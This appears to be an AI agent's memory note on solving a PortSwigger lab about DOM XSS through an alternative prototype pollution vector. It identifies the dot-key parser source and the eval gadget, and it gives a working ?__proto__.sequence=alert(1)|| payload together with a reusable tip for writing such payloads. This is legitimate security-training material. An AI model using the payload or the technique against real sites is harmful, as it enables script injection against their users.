---
metadata:
  node_type: memory
name: "Lab DOM XSS alternative prototype pollution vector"
description: "lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector solved: ?__proto__.sequence=alert(1)|| via $.parseParams dot-key source + manager.sequence eval gadget"
last_updated: 2026-10-09T19:21:36+08:00
created: 2026-10-09T19:21:36+08:00
---

Lab: DOM XSS via an alternative prototype pollution vector (PortSwigger, client-side PP). Instance https://0a0a005a044cc9b6817f34d300190001.web-security-academy.net/.

Shape found by reading the served JS, not by guessing:
- /resources/js/jquery_parseparams.js (jQuery BBQ-style $.parseParams) is the source. createElement(params, key, value) walks dot-keys: for key "__proto__.sequence" it does `if (!params[list[0]]) params[list[0]] = {}` — params["__proto__"] is Object.prototype (truthy, so not replaced) — then recurses into it, and the leaf branch runs `params[key] = value`, i.e. Object.prototype.sequence = <value>. So the alternative vector is the dot syntax `?__proto__.sequence=...`, no bracket form needed.
- /resources/js/searchLoggerAlternative.js is the gadget: `let a = manager.sequence || 1; manager.sequence = a + 1; eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }')`. The polluted string is coerced into the eval body with "1" appended, so the value must stay syntactically valid after that concatenation.

Working payload (one request, alert fires on load):
https://INSTANCE/?__proto__.sequence=alert(1)%7C%7C
The trailing `1` yields `manager.macro(alert(1)||1)` — alert runs, result discarded. A `//` comment value fails here: the appended 1 and the closing parens are eaten, leaving an unclosed call (SyntaxError).

Verification: page_alert on the payload URL → fired=true, alerts ["alert:1"]; then banner_verdict → solved=true with the congratulations line.

Lesson: when a PP gadget string-concatenates the polluted value into source (eval/Function/document.write), pick a value that absorbs the appended token (`||`, `&&`) instead of commenting it out; read the served JS first — the parser's key syntax is what tells you which source form pollutes.

